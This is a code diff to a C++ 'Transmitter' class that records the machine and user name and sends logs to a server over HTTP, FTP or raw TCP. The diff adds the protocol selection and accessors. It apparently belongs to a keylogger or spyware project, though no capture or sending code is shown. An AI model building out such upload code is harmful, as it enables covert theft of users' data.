@@ -1,11 +1,13 @@
 #include "pch.h"
 #include "Transmitter.h"
 
-// Transmitter() : Constructor of the transmitter class
-Transmitter::Transmitter(Logger* logger)
+// Transmitter(Logger, Protocol) : Constructor of the transmitter class
+Transmitter::Transmitter(Logger* logger, Protocol protocol)
+
 {
 	this->Transmitting = false; // Not transmitting by default
-
+	
+	this->SetProtocol(protocol);
 	this->Machine = Utilities::GetMachineName();
 	this->User = Utilities::GetUsername();
 
@@ -16,7 +18,13 @@ Transmitter::Transmitter(Logger* logger)
 // Start() : Start sending log to server (ment to be lunch in a thread)
 void Transmitter::Start()
 {
-	this->FtpSender();
+	// Lunch the appropriate transmission method depending of the protcol set
+	switch (this->GetProtocol())
+	{
+	case HTTP: this->HttpSender(); break;
+	case FTP: this->FtpSender(); break;
+	case TCP: this->SocketSender(); break;
+	}
 }
 
 // Stop() : Stop the transmitter 
@@ -169,6 +177,18 @@ void Transmitter::SocketSender()
 bool Transmitter::IsTransmitting() const
 {
 	return this->Transmitting;
+}
+
+// GetProtocol() : Return the protocol used by the Transmitter
+Protocol Transmitter::GetProtocol() const
+{
+	return this->Prot;
+}
+
+// SetProtocol() : Assign the protocol to be used by the transmitter 
+void Transmitter::SetProtocol(Protocol prot)
+{
+	this->Prot = prot;
 }
 
 // GetMachine() : Return the machine name
